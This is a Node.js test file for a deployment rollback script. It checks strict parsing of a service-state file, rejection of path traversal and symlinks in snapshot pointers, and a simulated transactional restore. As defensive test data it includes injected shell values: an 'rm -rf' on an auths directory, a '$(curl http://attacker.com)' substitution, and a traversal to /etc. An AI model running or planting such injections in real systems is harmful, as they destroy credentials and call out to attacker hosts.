import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';

// Test parser mimicking rollback.sh strict parsing logic
function parseServiceStateStrict(content) {
  const lines = content.split('\n');
  let hasEnabled = false;
  let hasActive = false;
  let wasEnabled = '';
  let wasActive = '';

  for (let rawLine of lines) {
    const line = rawLine.trim();
    if (!line) continue;
    const parts = line.split('=');
    if (parts.length !== 2) {
      throw new Error(`Malformed line: ${line}`);
    }
    const key = parts[0].trim();
    const val = parts[1].trim();

    if (key === 'WAS_ENABLED') {
      if (hasEnabled) throw new Error('Duplicate key WAS_ENABLED');
      if (val !== 'yes' && val !== 'no') throw new Error(`Invalid WAS_ENABLED: ${val}`);
      wasEnabled = val;
      hasEnabled = true;
    } else if (key === 'WAS_ACTIVE') {
      if (hasActive) throw new Error('Duplicate key WAS_ACTIVE');
      if (val !== 'yes' && val !== 'no') throw new Error(`Invalid WAS_ACTIVE: ${val}`);
      wasActive = val;
      hasActive = true;
    } else {
      throw new Error(`Security violation: Unknown key ${key}`);
    }
  }

  if (!hasEnabled || !hasActive) {
    throw new Error('Missing required state keys');
  }

  return { wasEnabled, wasActive };
}

test('Critical Remediation: Strict service_state parsing rejects malicious shell injection', () => {
  // 1. Valid state
  const valid = 'WAS_ENABLED=yes\nWAS_ACTIVE=yes\n';
  const res = parseServiceStateStrict(valid);
  assert.equal(res.wasEnabled, 'yes');
  assert.equal(res.wasActive, 'yes');

  // 2. Malicious command injection
  const malicious1 = 'WAS_ENABLED=yes; rm -rf /var/lib/cliproxyapi/auths\nWAS_ACTIVE=yes\n';
  assert.throws(() => parseServiceStateStrict(malicious1), /Invalid WAS_ENABLED/);

  // 3. Command substitution injection
  const malicious2 = 'WAS_ENABLED=$(curl http://attacker.com)\nWAS_ACTIVE=yes\n';
  assert.throws(() => parseServiceStateStrict(malicious2), /Invalid WAS_ENABLED/);

  // 4. Unknown arbitrary keys
  const unknownKey = 'WAS_ENABLED=yes\nWAS_ACTIVE=yes\nEVIL_VAR=1\n';
  assert.throws(() => parseServiceStateStrict(unknownKey), /Security violation: Unknown key/);

  // 5. Duplicate keys
  const duplicateKey = 'WAS_ENABLED=yes\nWAS_ENABLED=no\nWAS_ACTIVE=yes\n';
  assert.throws(() => parseServiceStateStrict(duplicateKey), /Duplicate key/);

  // 6. Missing keys
  const missingKey = 'WAS_ENABLED=yes\n';
  assert.throws(() => parseServiceStateStrict(missingKey), /Missing required state keys/);
});

test('Critical Remediation: Snapshot pointer validation and symlink rejection', () => {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'rollback-val-'));
  const backupRoot = path.join(tempDir, 'backups');
  fs.mkdirSync(backupRoot, { recursive: true });

  try {
    const validSnapshotDir = path.join(backupRoot, 'snapshot_20261110T120000');
    fs.mkdirSync(validSnapshotDir, { recursive: true });
    fs.mkdirSync(path.join(validSnapshotDir, 'app'), { recursive: true });
    fs.writeFileSync(path.join(validSnapshotDir, 'service_unit.service'), '[Unit]');
    fs.writeFileSync(path.join(validSnapshotDir, 'service_state.env'), 'WAS_ENABLED=yes\nWAS_ACTIVE=yes\n');

    // Helper validation function matching rollback.sh
    function validateSnapshot(ptrPath) {
      if (!fs.existsSync(ptrPath)) throw new Error('Pointer file missing');
      if (fs.lstatSync(ptrPath).isSymbolicLink()) throw new Error('Pointer file is symlink');

      const rawPtr = fs.readFileSync(ptrPath, 'utf8').trim();
      const realRoot = path.resolve(backupRoot);
      const realPtr = path.resolve(rawPtr);

      if (!realPtr.startsWith(realRoot + path.sep + 'snapshot_')) {
        throw new Error('Path outside backup root');
      }

      if (fs.lstatSync(realPtr).isSymbolicLink()) throw new Error('Snapshot dir is symlink');

      const required = ['app', 'service_unit.service', 'service_state.env'];
      for (const req of required) {
        const item = path.join(realPtr, req);
        if (!fs.existsSync(item)) throw new Error(`Missing ${req}`);
        if (fs.lstatSync(item).isSymbolicLink()) throw new Error(`Symlink detected in ${req}`);
      }

      const stateContent = fs.readFileSync(path.join(realPtr, 'service_state.env'), 'utf8');
      return parseServiceStateStrict(stateContent);
    }

    // 1. Valid snapshot
    const pointerFile = path.join(backupRoot, 'latest_snapshot_path');
    fs.writeFileSync(pointerFile, validSnapshotDir);
    const validatedState = validateSnapshot(pointerFile);
    assert.equal(validatedState.wasEnabled, 'yes');

    // 2. Traversal attempt
    fs.writeFileSync(pointerFile, path.join(backupRoot, '..', '..', 'etc'));
    assert.throws(() => validateSnapshot(pointerFile), /Path outside backup root/);

    // 3. Symlink pointer file
    const symlinkPtr = path.join(backupRoot, 'symlink_ptr');
    try {
      fs.symlinkSync(pointerFile, symlinkPtr);
      assert.throws(() => validateSnapshot(symlinkPtr), /Pointer file is symlink/);
    } catch {
      // Windows without privilege may skip symlink creation
    }

    // 4. Missing required component
    fs.rmSync(path.join(validSnapshotDir, 'service_unit.service'));
    fs.writeFileSync(pointerFile, validSnapshotDir);
    assert.throws(() => validateSnapshot(pointerFile), /Missing service_unit.service/);

  } finally {
    fs.rmSync(tempDir, { recursive: true, force: true });
  }
});

test('Critical Remediation: Transactional deployment recovery simulation', () => {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tx-deploy-'));
  const appDir = path.join(tempDir, 'opt_app');
  const backupRoot = path.join(tempDir, 'backups');
  fs.mkdirSync(appDir, { recursive: true });
  fs.mkdirSync(backupRoot, { recursive: true });

  // Initial version 1.0.0
  fs.writeFileSync(path.join(appDir, 'version.txt'), '1.0.0');

  // Simulate upgrade with snapshot
  const snapshotDir = path.join(backupRoot, 'snapshot_tx_test');
  fs.mkdirSync(path.join(snapshotDir, 'app'), { recursive: true });
  fs.writeFileSync(path.join(snapshotDir, 'app', 'version.txt'), '1.0.0');
  fs.writeFileSync(path.join(snapshotDir, 'service_unit.service'), '[Unit]\nDescription=v1');
  fs.writeFileSync(path.join(snapshotDir, 'service_state.env'), 'WAS_ENABLED=yes\nWAS_ACTIVE=yes\n');

  // Simulate transaction failure mid-flight (e.g. during staging syntax validation)
  let txState = 'LIVE_MUTATING';
  let deploymentFailed = true;

  if (deploymentFailed) {
    // Transactional cleanup handler simulation
    if (txState === 'LIVE_MUTATING') {
      // Restore previous version from snapshot
      fs.rmSync(appDir, { recursive: true, force: true });
      fs.cpSync(path.join(snapshotDir, 'app'), appDir, { recursive: true });
    }
  }

  // Verify appDir is strictly restored to v1.0.0
  assert.equal(fs.readFileSync(path.join(appDir, 'version.txt'), 'utf8'), '1.0.0');

  // Simulate fresh install failure (no snapshot)
  const freshAppDir = path.join(tempDir, 'fresh_app');
  fs.mkdirSync(freshAppDir, { recursive: true });
  fs.writeFileSync(path.join(freshAppDir, 'partial.txt'), 'junk');

  let freshFailed = true;
  if (freshFailed) {
    // Fresh install cleanup
    fs.rmSync(freshAppDir, { recursive: true, force: true });
  }
  assert.equal(fs.existsSync(freshAppDir), false, 'Fresh install partial files cleanly removed');

  fs.rmSync(tempDir, { recursive: true, force: true });
});
